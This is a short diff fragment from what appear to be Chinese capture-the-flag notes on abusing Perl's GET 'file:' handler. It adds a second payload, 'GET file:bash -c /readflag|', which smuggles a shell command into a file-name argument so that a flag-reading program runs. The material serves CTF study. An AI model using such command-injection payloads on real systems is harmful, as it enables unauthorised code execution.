@@ -23,4 +23,7 @@ GET /
 查看根目录目录
 GET file:|readflag
 会执行readflag程序的命令，并返回程序执行结果到readflag文件，没有先创建。
+
+GET file:bash -c /readflag|
+会执行readflag程序命令，并返回程序执行结果到readflag|文件，没有先创建。
 ```
